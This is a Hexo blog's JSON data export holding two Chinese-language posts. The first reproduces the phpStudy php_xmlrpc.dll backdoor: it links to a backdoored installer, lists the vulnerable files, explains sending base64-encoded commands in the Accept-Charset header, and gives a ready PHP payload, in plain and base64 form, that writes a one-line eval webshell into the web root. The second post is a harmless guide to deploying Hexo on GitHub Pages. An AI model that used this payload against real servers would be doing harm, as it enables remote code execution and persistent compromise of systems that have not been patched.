{"meta":{"title":"Pikachu","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"phpstudy后门漏洞复现","slug":"phpstudy后门","date":"2022-07-21T02:42:55.000Z","updated":"2022-07-21T07:14:39.580Z","comments":true,"path":"2022/07/21/phpstudy后门/","link":"","permalink":"http://example.com/2022/07/21/phpstudy%E5%90%8E%E9%97%A8/","excerpt":"","text":"# 漏洞介绍 2019 年 9 月 20，网上传出 phpstudy 软件存在后门，随后作者立即发布生命进行澄清，其真实情况是该软件官网在 2016 年被非法入侵，程序包自带 PHP 的 php_xmlrpc.dll 模块被植入隐藏后门，可以正向执行任意 php 代码。 影响版本： phpStudy2016-php-5.2.17 phpStudy2016-php-5.4.45 phpStudy2018-php-5.2.17 phpStudy2018-php-5.4.45 # 环境安装 本次环境复现我们拿 phpStudy-2018 搭建 phpstudy-2018 后门版：https://pan.baidu.com/s/1s55fGSRt9N6zYpFCU8hxyw 提取码:y9cg 这个和正常的安装一样，只不过启动环境的时候，开启非服务模式 # 漏洞的检测 如果 phpstduy 存在后门会在一下路径文件中 1234567# phpStudy2016路径php\\php-5.2.17\\ext\\php_xmlrpc.dllphp\\php-5.4.45\\ext\\php_xmlrpc.dll# phpStudy2018路径PHPTutorial\\php\\php-5.2.17\\ext\\php_xmlrpc.dllPHPTutorial\\php\\php-5.4.45\\ext\\php_xmlrpc.dll 如果 PHPTutorial\\php\\php-5.4.45\\ext\\php_xmlrpc.dll 文件存在 @eval (% s (’% s’)); 说明存在后门 # 漏洞复现 我们使用 burpsite 工具抓包后把 accept-charset 添加到请求头里面去，在这个 accept-charset 后面添加需要执行的命令，但是需要进行 base64 编码 ** 注意：** 要把 gzip,deflate 中间逗号后面的空格去掉不然无法执行命令。 这里我们可以利用这个写入 webshell，我们先需要知道绝对路径，这里我们可以访问 phpinfo 文件 这里我们知道绝对路径后就可以利用 phpstudy 后门漏洞写木马。 123fputs(fopen(&#x27;C:/phpStudy/PHPTutorial/WWW/shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[123]);?&gt;&#x27;)bas64编码后ZnB1dHMoZm9wZW4oJ0M6L3BocFN0dWR5L1BIUFR1dG9yaWFsL1dXVy9zaGVsbC5waHAnLCd3JyksJzw/cGhwIEBldmFsKCRfUE9TVFsxMjNdKTs/PicpOw== 用 webshell 工具连接成功","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"phpstudy后门漏洞复现","slug":"phpstudy后门漏洞复现","permalink":"http://example.com/tags/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"github搭建hexo","slug":"hexo搭建","date":"2022-07-13T08:22:16.000Z","updated":"2022-07-21T07:18:17.527Z","comments":true,"path":"2022/07/13/hexo搭建/","link":"","permalink":"http://example.com/2022/07/13/hexo%E6%90%AD%E5%BB%BA/","excerpt":"","text":"# 介绍 由于我以前那个博客是由阿里云的服务器搭建的，但是服务器太贵了，我就利用 github 搭建 hexo。 优点：白嫖、访问速度还行 缺点：搭建比较麻烦，写文章变得很痛苦（你用了就知道了） # 搭建 # 1. 环境准备 Node.js：https://nodejs.org/zh-cn Git：https://git-scm.com/downloads 这两个环境搭建就不用说了吧（安装时一直点击下一步） # 2. 连接 github # 注册 github 账号 注册我就不写教程了，直接利用邮箱注册，选择免费账户，就可以了。 123win+r打开cmd输入一下命令，如果不行的话就右键你的hexo文件夹，Git Bash Here。git config --global user.name &quot;Github 用户名&quot;git config --global user.email &quot;Github 邮箱&quot; # 创建 ssh 密钥 在命令框输入ssh-keygen -t rsa -C “Github 邮箱”，然后一直回车。 # 添加密钥 进入刚刚创建密钥的目录（如果没有看到勾选 “显示隐藏项目试试”），用记事本打开 id_rsa.pub 文件并复制里面的内容。 然后点击 github 的 setting 然后再 cmd 命令框输入ssh -T git@github. com出现了下面这张图的返回数据就成功了 # 3. 创建 Github Pages 仓库 这样就已经创建成功了。 # 4. 本地搭建 hexo 使用npm install -g hexo-cli&gt; 命令安装 hexo，可以使用 hexo -v 查看版本信息，下载 hexo 框架，可以使用官网的一键配置命令，也可以再官网下载。 使用这个命令一键下载，下载好进入 hexo 目录使用hexo install命令初始化，使用hexo s&gt; 命令在本地开启 http 服务，访问 http://localhost:4000 就能看到网站了。 # 5. 部署到 github 上 进入 hexo 目录下打开_config.yml 文件 滑到最后，配置连接 github 仓库的参数。 1234deploy: type: git //这里就填git，应为我们是利用git工具提交到仓库的 repo: //这里直接复制github仓库的ssh连接就可以了 branch: main //这里是仓库有两个分子，这里需要注意如果提交main没有反应就提交master 这样就好了，我们在本地就布置好了 我们使用一下三个命令 123hexo clean //清楚缓存hexo g //重新生成改动的文件hexo d //上传到github仓库 使用后访问用户名.github.io就可以了，提交后要过一会它才会加载出来不要着急 这样就已经简单的搭建好了，后面会慢慢更新的 如何安装主题 如何发布文章 hexo 常用命令 常见的问题","categories":[{"name":"art","slug":"art","permalink":"http://example.com/categories/art/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://example.com/tags/hexo/"}]}],"categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"},{"name":"art","slug":"art","permalink":"http://example.com/categories/art/"}],"tags":[{"name":"phpstudy后门漏洞复现","slug":"phpstudy后门漏洞复现","permalink":"http://example.com/tags/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"hexo","slug":"hexo","permalink":"http://example.com/tags/hexo/"}]}